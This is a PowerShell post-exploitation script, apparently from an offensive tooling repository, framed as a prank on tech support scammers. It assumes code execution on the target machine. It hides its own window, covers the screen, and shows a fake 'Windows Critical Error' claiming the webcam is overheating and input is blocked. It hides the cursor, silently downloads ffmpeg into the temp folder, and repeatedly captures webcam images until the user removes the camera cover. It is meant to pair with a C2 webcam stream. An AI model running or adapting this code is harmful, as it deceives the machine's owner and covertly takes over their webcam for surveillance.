<# ================== Webcab Uncover Tool ==================

SYNOPSIS
If a webcam device is found on the target system this script generates a cover screen and a fake error message
and then hides the mouse cursor.
ffmpeg is used to save a webcam image (image1.jpg) and then a secondary image (image2.jpg) every 3 seconds (to temp folder)
and compares brightness difference between images each time image2 is taken. 
if brightness has changed more the 20% from image1 then the screen cover closes and the system is 'unblocked'

NOTE
This is designed to have the victim (eg. tech support scammer) uncover their webcam if it is covered by tape etc.
This assumes you already have code execution on the scammers system and can execute this script.
Use with this tool with webcam stream to capture results - https://github.com/beigew0rm/PoshCord-C2               

Inspired by John Hammond and 0day - https://www.youtube.com/watch?v=-R_2JtpSx4A&t=230s 

#>

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$Width = $screen.Bounds.Width
$Height = $screen.Bounds.Height

$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'black'
$form.Opacity = 1 #0.004
$form.ShowInTaskbar = $false

# Create the label
$phone = New-Object System.Windows.Forms.Label
$phone.Text = "Your webcam is overheating! Remove your webcam cover before the temperature affects your device.`n`nKeyboard and Mouse input blocked until webcam cover is removed."
$phone.ForeColor = "#bcbcbc"
$phone.AutoSize = $true
$phone.Font = 'Microsoft Sans Serif,18,style=Bold'
$phone.TextAlign = 'MiddleCenter'
$form.Controls.Add($phone)

$form.Add_Load({
    # Measure the size of the label
    $phoneWidth = $phone.Width
    $phoneHeight = $phone.Height

    # Calculate the centered position for the label
    $centerX = [math]::Round(($Width - $phoneWidth) / 2)
    $centerY = [math]::Round(($Height - $phoneHeight) / 2)

    # Set the label's location to be centered
    $phone.Location = New-Object System.Drawing.Point($centerX, $centerY)
})

$errorbox = {

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    [System.Windows.Forms.Application]::EnableVisualStyles()
    
    $errorForm = New-Object Windows.Forms.Form
    $errorForm.Width = 450
    $errorForm.Height = 180
    $errorForm.TopMost = $true
    $errorForm.StartPosition = 'CenterScreen'
    $errorForm.Text = 'Windows Critical Error'
    $icon = [System.Drawing.SystemIcons]::Error
    $errorForm.Icon = $icon
    
    $label = New-Object Windows.Forms.Label
    $label.AutoSize = $false
    $label.Width = 350
    $label.Height = 80
    $label.TextAlign = 'MiddleCenter'
    $label.Text = "Your webcam is overheating! Remove your webcam cover before the temprature affects your device.`n`nKeyboard and Mouse input blocked until webcam cover is removed."
    $label.Location = New-Object System.Drawing.Point(70, 10)
    
    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "OK"
    $okButton.Width = 80
    $okButton.Height = 25
    $okButton.Location = New-Object System.Drawing.Point(180, 100)
    
    $errorpic = New-Object Windows.Forms.PictureBox
    $errorpic.SizeMode = 'StretchImage'
    $errorpic.Width = 48
    $errorpic.Height = 48
    $errorpic.Image = [System.Drawing.SystemIcons]::Error.ToBitmap()
    $errorpic.Location = New-Object System.Drawing.Point(15, 25)
    
    $errorForm.controls.AddRange(@($label, $okButton, $errorpic))
    
    $okButton.Add_Click({
        [System.Windows.Forms.Cursor]::Show()
        $errorForm.Close()
        exit                    
    })
    
    sleep 3
    [System.Windows.Forms.Cursor]::Hide()
    [void]$errorForm.ShowDialog()
    
}

Function GetFfmpeg{
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)){  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

Function Get-BrightnessDifference {
    param (
        [string]$Image1Path,
        [string]$Image2Path
    )

    $bitmap1 = [System.Drawing.Bitmap]::FromFile($Image1Path)
    $bitmap2 = [System.Drawing.Bitmap]::FromFile($Image2Path)
    Write-Host "Comparing.." -ForegroundColor Yellow
    try {
        # Initialize variables for brightness calculation
        $brightness1 = 0
        $brightness2 = 0

        # Loop through each pixel of both images to calculate average brightness
        for ($x = 0; $x -lt $bitmap1.Width; $x++) {
            for ($y = 0; $y -lt $bitmap1.Height; $y++) {
                # Get pixel colors for both images
                $pixel1 = $bitmap1.GetPixel($x, $y)
                $pixel2 = $bitmap2.GetPixel($x, $y)

                # Convert pixel to grayscale (brightness)
                $brightness1 += ($pixel1.R * 0.299 + $pixel1.G * 0.587 + $pixel1.B * 0.114) / 255
                $brightness2 += ($pixel2.R * 0.299 + $pixel2.G * 0.587 + $pixel2.B * 0.114) / 255
            }
        }

        # Calculate the average brightness for each image
        $brightness1 = $brightness1 / ($bitmap1.Width * $bitmap1.Height)
        $brightness2 = $brightness2 / ($bitmap2.Width * $bitmap2.Height)

        # Calculate the percentage difference between two brightness levels
        $difference = ([math]::Abs($brightness1 - $brightness2)) * 100
        return $difference
    }
    finally {
        # Ensure that the bitmaps are disposed and resources are released
        $bitmap1.Dispose()
        $bitmap2.Dispose()
    }
}


$script:imagePath1 = "$env:Temp\Image1.png"
$script:imagePath2 = "$env:Temp\Image2.png"
GetFfmpeg
Start-Job -ScriptBlock $errorbox -Name Error | Out-Null
$form.Show()
[System.Windows.Forms.Cursor]::Hide()

$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
if (!($input)){
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name
}

# Capture first image
if ($input){
    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -vf scale=1280:720 -frames:v 1 -y $imagePath1 | Out-Null
}

while ($input) {

    sleep 3
    # Capture new image
    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -vf scale=1280:720 -frames:v 1 -y $imagePath2 | Out-Null

    # Compare brightness between two images
    $brightnessDifference = Get-BrightnessDifference -Image1Path $imagePath1 -Image2Path $imagePath2

    # If brightness difference exceeds 10%, break the loop
    if ($brightnessDifference -gt 20) {
        Write-Host "Success!" -ForegroundColor Green
        sleep 1
        break
    }
    else{
        Write-Host "No Change." -ForegroundColor Red
    }

}

# Restore cursor and close the form
[System.Windows.Forms.Cursor]::Show()
$form.Close()
rm -Path $imagePath1 -Force
rm -Path $imagePath2 -Force
sleep 1
exit